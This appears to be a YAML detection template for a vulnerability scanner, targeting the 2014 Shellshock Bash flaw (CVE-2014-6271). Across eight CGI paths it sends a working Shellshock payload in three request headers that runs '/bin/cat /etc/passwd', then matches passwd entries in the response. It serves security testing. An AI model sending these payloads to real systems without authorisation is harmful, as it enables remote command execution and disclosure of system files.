id: CVE-2014-6271

info:
  name: ShellShock - Remote Code Execution
  author: neal1991
  severity: critical
  description: |
    ShellShock is a security vulnerability in the Bash shell that allows remote attackers to execute arbitrary commands on a vulnerable system.
    This vulnerability exists in Bash versions 4.3 and earlier.
  reference:
    - https://www.qualys.com/2014/09/24/bash-shebang-remote-code-execution-vulnerability/bash-shebang-remote-code-execution-vulnerability.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
    - https://nvd.nist.gov/vuln/detail/CVE-2014-7169
    - http://www.kb.cert.org/vuls/id/252743
    - http://www.us-cert.gov/ncas/alerts/TA14-268A
    - http://advisories.mageia.org/MGASA-2014-0388.html
  tags: cve,cve2014,rce,shellshock
  created: 2023/07/13

rules:
  r0:
    request:
      method: GET
      path: /
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /cgi-bin/status
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r2:
    request:
      method: GET
      path: /cgi-bin/stats
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r3:
    request:
      method: GET
      path: /cgi-bin/test
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r4:
    request:
      method: GET
      path: /cgi-bin/status/status.cgi
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r5:
    request:
      method: GET
      path: /test.cgi
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r6:
    request:
      method: GET
      path: /debug.cgi
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r7:
    request:
      method: GET
      path: /cgi-bin/test-cgi
      headers:
        Shellshock: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Referer: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
        Cookie: "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7()
